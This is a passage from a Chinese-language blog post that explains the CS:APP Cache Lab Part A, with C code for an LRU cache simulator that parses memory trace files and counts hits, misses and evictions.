            <a href="/2024/03/22/CSAPP-Lab5/" class="post-title-link" itemprop="url">CSAPP CacheLab</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-03-22 17:00:27" itemprop="dateCreated datePublished" datetime="2024-03-22T17:00:27+08:00">2024-03-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-27 15:44:24" itemprop="dateModified" datetime="2024-03-27T15:44:24+08:00">2024-03-27</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
<li><p>实验讲义：<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/cachelab.pdf">cachelab.dvi (cmu.edu)</a></p>
</li>
<li><p>本实验将帮助您了解缓存内存对 C 程序性能的影响</p>
</li>
<li><p>该实验室由两部分组成：</p>
<ul>
<li>在第一部分中，您将编写一个模拟缓存行为的小型 C 程序（大约 200-300 行）</li>
<li>在第二部分中，您将优化一个小矩阵转置函数，目标是最大限度地减少缓存未命中次数。</li>
</ul>
</li>
<li><p>您将修改两个文件：csim.c 和 trans.c。若要编译这些文件，请键入 <strong>make clean</strong>、<strong>make</strong></p>
</li>
<li><p>traces 子目录包含引用跟踪文件的集合，我们将使用这些文件来评估您在 A 部分中编写的缓存模拟器的正确性</p>
</li>
<li><p>跟踪文件中的内容具有以下形式：[space] operation address,size</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">I 0400d7d4,8</span><br><span class="line"> M 0421c7f0,4</span><br><span class="line"> L 04f6b868,8</span><br><span class="line"> S 7ff0005c8,8</span><br></pre></td></tr></table></figure>

<ul>
<li>I 表示指令加载，每个 I 之前永远不会有空格</li>
<li>L 表示数据加载，S 表示数据存储，M 表示数据修改（即数据加载后跟数据存储），每个 M、L 和 S 之前总是有一个空格</li>
<li>address 字段指定 64 位十六进制内存地址</li>
<li>size 字段指定操作访问的字节数</li>
</ul>
<h1 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h1><ul>
<li><p>Part A 要求我们在 <strong>csim.c</strong> 文件中编写一个缓存模拟器，它可以跟踪并输出缓存的命中、未命中、逐出的次数</p>
</li>
<li><p>官方提供了一个可执行的二进制文件 <strong>csim-ref</strong> 模拟缓存的行为</p>
</li>
<li><p>csim-ref 在选择要逐出的缓存行时，它使用 LRU（最近最少使用）替换策略</p>
</li>
<li><p>csim-ref 可以通过 <strong>.&#x2F;csim-ref [-hv] -s &lt; s &gt; -E &lt; E &gt; -b &lt; b &gt; -t &lt; tracefile &gt;</strong> 运行</p>
<ul>
<li>&lt; s &gt; 表示缓存的组数；&lt; E &gt; 表示关联性，即每组的行数</li>
<li>&lt; b &gt; 表示一个块的字节数；&lt; tracefile &gt; 表示跟踪文件的名称</li>
<li>-hv 是可选的，-h 表示打印帮助，-v 表示显示详细跟踪信息</li>
</ul>
</li>
<li><p>运行结果如下</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">linux&gt; ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace</span><br><span class="line">hits:4 misses:5 evictions:3</span><br><span class="line"></span><br><span class="line">linux&gt; ./csim-ref -v -s 4 -E 1 -b 4 -t traces/yi.trace</span><br><span class="line">L 10,1 miss</span><br><span class="line">M 20,1 miss hit</span><br><span class="line">L 22,1 hit</span><br><span class="line">S 18,1 hit</span><br><span class="line">L 110,1 miss eviction</span><br><span class="line">L 210,1 miss eviction</span><br><span class="line">M 12,1 miss eviction hit</span><br><span class="line">hits:4 misses:5 evictions:3</span><br></pre></td></tr></table></figure>

<ul>
<li>我们的工作是填充 csim.c 文件，以便它 <strong>采用相同的命令行参数并生成与 csim-ref 相同的输出</strong> </li>
<li>注意事项<ul>
<li>使用 malloc 函数为模拟器的数据结构分配存储，通过 man malloc 以获取有关此函数的信息</li>
<li>我们只对数据缓存性能感兴趣，因此您的模拟器应忽略所有指令缓存访问（以 I 开头的行）</li>
<li>您必须在主函数的末尾调用函数 printSummary，其中包含命中、未命中和逐出的总数：<strong>printSummary(hit_count, miss_count, eviction_count);</strong></li>
</ul>
</li>
</ul>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><ul>
<li>定义 cache 中组的一行，通过时间戳来记录组中每行使用的先后情况</li>
<li>bool 类型需要头文件：stdbool.h</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">L</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> tag;	<span class="comment">// 标记位</span></span><br><span class="line">    <span class="type">bool</span> vaild;	<span class="comment">// 有效位</span></span><br><span class="line">    <span class="type">int</span> stamp;	<span class="comment">// 时间戳</span></span><br><span class="line">    <span class="comment">// int *block;  这里只是模拟，并不需要实际定义块</span></span><br><span class="line">&#125; Line;</span><br></pre></td></tr></table></figure>

<ul>
<li>定义 cache，groups 表示 cache 中所有的组，一个组有多个行，所以用 Line **</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">g</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> s;	<span class="comment">// 组数</span></span><br><span class="line">    <span class="type">int</span> e;	<span class="comment">// 关联性</span></span><br><span class="line">    <span class="type">int</span> b;	<span class="comment">// 块位数</span></span><br><span class="line">    Line **groups;	</span><br><span class="line">&#125; Cache;</span><br></pre></td></tr></table></figure>

<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><ul>
<li>这里有一个 “小” 细节，参数 s 并不是真正的组数，组数 &#x3D; 2^s^；b 也不是真正的块位数，块位数 &#x3D; 2^b^；而 e 确实是真正的一组中的行数。这个 “小” 细节让我检查了半天！</li>
<li>malloc 需要包含头文件：stdlib.h</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> s 组数</span></span><br><span class="line"><span class="comment"> e 关联性</span></span><br><span class="line"><span class="comment"> b 块位数</span></span><br><span class="line"><span class="comment"> 初始化缓存（尽量所用 sizeof，增强可移植性）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> e, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="type">int</span> S = <span class="number">1</span> &lt;&lt; s;</span><br><span class="line">    <span class="type">int</span> B = <span class="number">1</span> &lt;&lt; b;</span><br><span class="line">    cache.s = S;</span><br><span class="line">    cache.e = e;</span><br><span class="line">    cache.b = B;</span><br><span class="line">    cache.groups = (Line**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Line*) * S); </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; S; i++) &#123;</span><br><span class="line">    	cache.groups[i] = (Line*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Line) * e);</span><br><span class="line">    	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; e; j++) &#123;</span><br><span class="line">    	    cache.groups[i][j].tag = <span class="number">-1</span>;</span><br><span class="line">    	    cache.groups[i][j].stamp = <span class="number">0</span>;</span><br><span class="line">    	    cache.groups[i][j].vaild = <span class="literal">false</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="跟踪文件"><a href="#跟踪文件" class="headerlink" title="跟踪文件"></a>跟踪文件</h2><ul>
<li>这里我们需要读入跟踪文件的内容，根据文件内容的形式 [space] operation address,size 读取出 space 和 address，根据 address 读出访问的组索引和标记，根据 space 来选择进行一次还是两次的更新</li>
<li>读文件时，要根据内容的形式设置相应的格式说明符，例如：space address,size 就应该设置为 %c %x,%d，如果你没有注意，设置成了 %c, %x, %d，那就很难检查出来了（说的就是我！）</li>
<li>根据 address 提取 groupIndex，利用了位运算的相关知识<ul>
<li>address &gt;&gt; b 使得 address 的低 s 位为 groupIndex</li>
<li>（unsigned）-1 得到 11……11，右移时默认为了逻辑右移</li>
<li>sizeof（unsigned）* 8 可以得到任何机器系统上的 int 的位数，sizeof 增强了代码的可移植性，* 8 是因为一个字节 8 位</li>
<li>-s 使得当进行 &amp; 运算时保留低 s 位</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> s 组数</span></span><br><span class="line"><span class="comment"> b 块位数</span></span><br><span class="line"><span class="comment"> 读取文件，根据地址模拟缓存中的行为</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">trace</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    FILE *file = fopen(tracefile, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;Fail to open the file!\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> space;	<span class="comment">// 内存访问类型</span></span><br><span class="line">    <span class="type">unsigned</span> address; 	<span class="comment">// 操作地址</span></span><br><span class="line">    <span class="type">int</span> size;	<span class="comment">// 访问字节数</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">&quot;%c %x, %d&quot;</span>, &amp;space, &amp;address, &amp;size) != EOF) &#123; <span class="comment">// 细节</span></span><br><span class="line">    	<span class="type">int</span> tag = address &gt;&gt; (s + b);	</span><br><span class="line">    	<span class="type">int</span> groupIndex = (address &gt;&gt; b) &amp; ((<span class="type">unsigned</span>)(<span class="number">-1</span>) &gt;&gt; (<span class="keyword">sizeof</span>(<span class="type">unsigned</span>) * <span class="number">8</span>  - s)); </span><br><span class="line">    	<span class="keyword">switch</span> (space) &#123;</span><br><span class="line">    	<span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">    	    update(groupIndex, tag);	<span class="comment">// 数据加载</span></span><br><span class="line">    	    <span class="keyword">break</span>;</span><br><span class="line">    	<span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">    	    update(groupIndex, tag);	<span class="comment">// 数据存储</span></span><br><span class="line">    	    <span class="keyword">break</span>;</span><br><span class="line">    	<span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">    	    update(groupIndex, tag);	<span class="comment">// 数据修改（加载 + 存储）</span></span><br><span class="line">    	    update(groupIndex, tag);</span><br><span class="line">    	    <span class="keyword">break</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><ul>
<li>更新命中 &#x2F; 未命中 &#x2F; 驱逐总数</li>
<li>这里有一个小细节，如果冲突未命中，那么一定缓存未命中，反之则不一定</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> groupIndex 组索引</span></span><br><span class="line"><span class="comment"> tag 标记值</span></span><br><span class="line"><span class="comment"> 更新命中数/不命中数/驱逐数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">update</span><span class="params">(<span class="type">int</span> groupIndex, <span class="type">int</span> tag)</span> &#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ((index = isHit(groupIndex, tag)) != <span class="number">-1</span>) &#123; <span class="comment">// 判断是否命中</span></span><br><span class="line">    	update_stamp(groupIndex, index, tag);</span><br><span class="line">    	++hit_count;</span><br><span class="line">    	<span class="keyword">if</span> (verbose) <span class="built_in">printf</span>(<span class="string">&quot;hit&quot;</span>);</span><br><span class="line">    	<span class="keyword">return</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    ++miss_count;</span><br><span class="line">    <span class="keyword">if</span> (verbose) <span class="built_in">printf</span>(<span class="string">&quot;mis&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((index = isNotEvict(groupIndex)) == <span class="number">-1</span>) &#123; <span class="comment">// 判断是否不是冲突未命中</span></span><br><span class="line">    	</span><br><span class="line">    	index = getLast(groupIndex);</span><br><span class="line">    	++eviction_count;</span><br><span class="line">    	<span class="keyword">if</span> (verbose) <span class="built_in">printf</span>(<span class="string">&quot;eviction&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    &#125; </span><br><span class="line">    update_stamp(groupIndex, index, tag);	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>得到当前组中最久没有使用过的行。我们使用 LRU 替换策略，定义时间戳为越大说明越久没有使用</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> groupIndex 组索引</span></span><br><span class="line"><span class="comment"> 在相关组中，得到时间戳最大的行索引</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">getLast</span><span class="params">(<span class="type">int</span> groupIndex)</span> &#123;</span><br><span class="line">    <span class="type">int</span> length = cache.e;</span><br><span class="line">    Line *line = cache.groups[groupIndex];</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (line[i].stamp &gt; max) &#123; </span><br><span class="line">            index = i;</span><br><span class="line">            max = line[i].stamp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>更新时间戳，将当前使用过的行的时间戳更新为 0，组中其余行的时间戳 +1</li>
<li>这里也包含了对于冲突未命中和缓存未命中的行的处理，设置相关的 tag、vaild，对于命中的情况则没有作用</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> groupIndex 组索引</span></span><br><span class="line"><span class="comment"> index 行索引</span></span><br><span class="line"><span class="comment"> tag 标记值</span></span><br><span class="line"><span class="comment"> 在相关组中，将相关行的时间戳更新为 0 更新 tag 更新 vaild，其余行时间戳增加</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">update_stamp</span><span class="params">(<span class="type">int</span> groupIndex, <span class="type">int</span> index, <span class="type">int</span> tag)</span> &#123;</span><br><span class="line">    cache.groups[groupIndex][index].vaild = <span class="literal">true</span>;</span><br><span class="line">    cache.groups[groupIndex][index].tag = tag;</span><br><span class="line">    <span class="type">int</span> length = cache.e;</span><br><span class="line">    Line *line = cache.groups[groupIndex];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">    	<span class="keyword">if</span> (line[i].vaild) &#123;</span><br><span class="line">    	    ++line[i].stamp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cache.groups[groupIndex][index].stamp = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><ul>
<li>判断当前组中是否命中，只有当 vaild 有效和 tag 相同同时满足时才表示命中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> groupIndex 组索引</span></span><br><span class="line"><span class="comment"> tag 标记值</span></span><br><span class="line"><span class="comment"> 如果命中了，返回命中行的索引，否则返回 -1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isHit</span><span class="params">(<span class="type">int</span> groupIndex, <span class="type">int</span> tag)</span> &#123;</span><br><span class="line">    Line *line = cache.groups[groupIndex];</span><br><span class="line">    <span class="type">int</span> length = cache.e;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">    	<span class="keyword">if</span> (line[i].vaild &amp;&amp; line[i].tag == tag) &#123;</span><br><span class="line">    	    <span class="keyword">return</span> i;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>判断是否不是冲突未命中，如果当前组中有一个 vaild 无效，就说明不是冲突未命中，因为 vaild 无效表示当前组中还有行为空</li>
<li>我们这里有一个条件假设，即我们每次都是在调用完 isHit 后才调用这个函数的，所以当不是冲突未命中时一定是缓存未命中（就是那种 “不是冲突未命中” 的缓存未命中啊！）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> groupIndex 组索引</span></span><br><span class="line"><span class="comment"> tag 标记值</span></span><br><span class="line"><span class="comment"> 这里有一个条件假设，即我们每次都是在调用完 isHit 后才调用 isNotEvict 的</span></span><br><span class="line"><span class="comment"> 如果不是冲突导致的不命中，返回第一个不冲突的行索引，否则返回 -1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isNotEvict</span><span class="params">(<span class="type">int</span> groupIndex)</span> &#123;</span><br><span class="line">    Line *line = cache.groups[groupIndex];</span><br><span class="line">    <span class="type">int</span> length = cache.e;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">    	<span class="keyword">if</span> (!line[i].vaild) </span><br><span class="line">    	    <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><ul>
<li>讲义中提示我们使用 getopt 方法读取命令行参数，hv 后没有：说明 hv 是可选的，s、E、b、t 后都有 ：说明后边必须跟着参数值</li>
<li>atoi 函数将字符串转换为 int</li>
<li>getopt 需要包含头文件：stdlib.h、unistd.h、getopt.h</li>
<li>strcpy 需要包含头文件：string.h</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;	</span><br><span class="line">    <span class="type">int</span> opt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> s = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> e = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">            print_help();</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">            verbose = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            s = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">            e = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            b = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(tracefile, optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            print_help();</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    init(s, e, b);</span><br><span class="line">    trace(s, b);</span><br><span class="line">    free_cache();</span><br><span class="line">    printSummary(hit_count, miss_count, eviction_count);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><ul>
<li>整理过后，Part A 的实现代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span 